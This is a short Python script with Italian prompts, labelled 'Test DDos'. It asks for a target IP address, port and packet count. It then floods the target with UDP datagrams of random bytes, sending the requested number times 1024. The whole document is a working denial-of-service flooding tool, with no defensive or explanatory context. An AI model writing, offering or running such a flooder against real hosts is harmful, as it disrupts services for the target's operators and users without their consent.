import socket
import random

print ("Test DDos")

SRV_ADDR = input ("Inserisci indirizzo IP bersglio:")
SRV_PORT = int ( input ("Inserisci la PORTA alla quale accedere:"))
pacchetti = int ( input ("Quanti pacchetti vuoi inviare?:"))
pacchetti_tot = pacchetti * 1024

for i in range(pacchetti_tot):

	pacchetti_tot=bytearray(random.getrandbits(8) for _ in range (0 , 255))
	s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.sendto(pacchetti_tot, (SRV_ADDR, SRV_PORT))

	print("Pacchetto", i+1, "inviato")

